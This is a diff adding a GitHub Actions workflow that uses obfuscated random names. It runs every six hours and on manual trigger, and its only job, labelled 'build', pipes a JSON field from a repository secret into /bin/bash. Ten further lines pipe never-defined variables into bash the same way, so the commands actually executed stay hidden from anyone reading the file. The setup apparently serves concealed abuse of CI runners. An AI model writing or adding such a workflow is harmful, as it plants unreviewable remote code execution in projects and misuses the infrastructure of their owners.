@@ -1,0 +1,27 @@
+name: zhouyiri2245
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhouyiri2245
+        env:
+          dam71616: ${{ secrets.dam71616 }}
+        run: |
+          echo $dam71616 | jq -r .cptu2321 | /bin/bash
+          echo $p2 | jq -r .uspp072 | /bin/bash
+          echo $lgpia22 | jq -r .pabxh1 | /bin/bash
+          echo $khqje11216 | jq -r .oths5616 | /bin/bash
+          echo $vrt98310 | jq -r .ihel7043 | /bin/bash
+          echo $oxxs29854 | jq -r .fvds62 | /bin/bash
+          echo $u050 | jq -r .qqall37 | /bin/bash
+          echo $derr00740 | jq -r .owgc2125 | /bin/bash
+          echo $wyxy2334 | jq -r .gi68454 | /bin/bash
+          echo $jroic7 | jq -r .mqpji04382 | /bin/bash
+          echo $jbds541 | jq -r .x1161 | /bin/bash
+
